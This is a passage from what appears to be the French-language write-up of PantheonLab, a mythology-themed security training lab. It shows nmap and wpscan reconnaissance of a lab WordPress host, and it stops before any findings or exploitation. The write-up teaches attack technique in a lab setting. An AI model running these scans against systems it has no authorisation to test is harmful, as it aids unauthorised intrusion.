
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Documentation complète du lab de sécurité Active Directory inspiré de la mythologie grecque">
      
      
        <meta name="author" content="PantheonLab Team">
      
      
        <link rel="canonical" href="https://pantheonlab.github.io/writeup/writeup/">
      
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.15">
    
    
      
        <title>WriteUP - PantheonLab Documentation</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cinzel:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Cinzel";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="custom">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#writeup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="PantheonLab Documentation" class="md-header__button md-logo" aria-label="PantheonLab Documentation" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            PantheonLab Documentation
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              WriteUP
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="custom"  aria-label="Basculer vers le thème sombre"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Basculer vers le thème sombre" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="custom"  aria-label="Basculer vers le thème clair"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Basculer vers le thème clair" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/0xbbuddha/pantheonlab" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    PantheonLab
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
  
    
  
  Accueil

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../presentation/overview/" class="md-tabs__link">
          
  
  
  Présentation

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../installation/prerequisites/" class="md-tabs__link">
          
  
  
  Installation

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../introduction/" class="md-tabs__link">
          
  
  
  Writeup

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../references/resources/" class="md-tabs__link">
          
  
  
  Références

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="PantheonLab Documentation" class="md-nav__button md-logo" aria-label="PantheonLab Documentation" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    PantheonLab Documentation
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/0xbbuddha/pantheonlab" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    PantheonLab
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Accueil
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Présentation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Présentation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../presentation/overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vue d'ensemble
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../presentation/architecture/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Architecture
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../presentation/theme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Thématique
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Installation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Installation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../installation/prerequisites/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Prérequis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../installation/quickstart/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Installation rapide
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Writeup
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Writeup
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Énumération
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../foothold_linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FootHold_Linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../foothold_windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FootHold_Windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows_privesc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows_Privesc
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux_privesc_hera/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux_Privesc
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../conclusion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Conclusion
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Références
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Références
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../references/resources/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Ressources
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#scan-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Scan Nmap
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="writeup">WriteUP</h1>
<p>Quand on lance ce lab, on ce retrouve avec une seul machine exposer sur l’ip <code>192.168.56.10</code>. Ainsi on commence notre énumération sur cette machine  avec un <code>nmap</code> pour essayer de trouver un moyen d’avoir accès à la machine</p>
<h3 id="scan-nmap">Scan Nmap</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap -sn 192.168.56.1/24          
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-22 14:02 CEST
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap scan report for 192.168.56.10
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host is up (0.00018s latency).
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmapfull<span class="w"> </span>pantheon.god
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-05-27<span class="w"> </span><span class="m">02</span>:10<span class="w"> </span>CEST
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Stats:<span class="w"> </span><span class="m">0</span>:00:06<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Service<span class="w"> </span>Scan
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Service<span class="w"> </span>scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">50</span>.00%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">02</span>:10<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:06<span class="w"> </span>remaining<span class="o">)</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>pantheon.god<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.56.10<span class="o">)</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0011s<span class="w"> </span>latency<span class="o">)</span>.
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.7<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:
<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>5ac5588f4e5f39879805d7eaf60cdc6e<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>8ccbd941886aea2ec2d28f9f73f24d71<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>9ba0c18717b81ab3c8483a025378d7ca<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="p">|</span>_http-generator:<span class="w"> </span>WordPress<span class="w"> </span><span class="m">6</span>.8.1
<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry
<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="p">|</span>_/wp-admin/
<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="p">|</span>_http-title:<span class="w"> </span>Pantheon
<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:AB:3D:50<span class="w"> </span><span class="o">(</span>Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">10</span>.27<span class="w"> </span>seconds
</code></pre></div>
<p>On trouve un port <code>22</code> pour ssh et un port <code>80</code> pour http.</p>
<p>Quand on tente d’accéder au port 80, on est rediriger sur l’adresse <code>pantheaon.lab</code> </p>
<p>Avec <code>wapalyzer</code>, on trouve que le site est sur wordpress, hors souvent avec wordpress, on trouve qu’il y a pléthore de plugins vulnérable, ce qui doit donc nous motiver à trouver un plugins qui pourrait être vulnérable. </p>
<ul>
<li>
<p>Pour cela on peut utiliser l’outils <code>wp-scan</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span><span class="w"> </span>--plugins-detection<span class="w"> </span>aggressive
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>_______________________________________________________________
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">         </span>__<span class="w">          </span>_______<span class="w">   </span>_____
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">         </span><span class="se">\ \ </span><span class="w">       </span>/<span class="w"> </span>/<span class="w">  </span>__<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>____<span class="p">|</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">          </span><span class="se">\ \ </span><span class="w"> </span>/<span class="se">\ </span><span class="w"> </span>/<span class="w"> </span>/<span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>___<span class="w">   </span>___<span class="w">  </span>__<span class="w"> </span>_<span class="w"> </span>_<span class="w"> </span>__<span class="w"> </span>®
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">           </span><span class="se">\ \/</span><span class="w">  </span><span class="se">\/</span><span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w">  </span>___/<span class="w"> </span><span class="se">\_</span>__<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>__<span class="p">|</span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ \</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="s1">         WordPress Security Scanner by the WPScan Team</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="s1">                         Version 3.8.28</span>
<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="s1">       Sponsored by Automattic - https://automattic.com/</span>
<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span>
<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="s1">_______________________________________________________________</span>
<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="s1">[+] URL: http://pantheon.god/ [192.168.56.10]</span>
<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="s1">[+] Started: Tue May 27 02:01:37 2025</span>
<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="s1">Interesting Finding(s):</span>
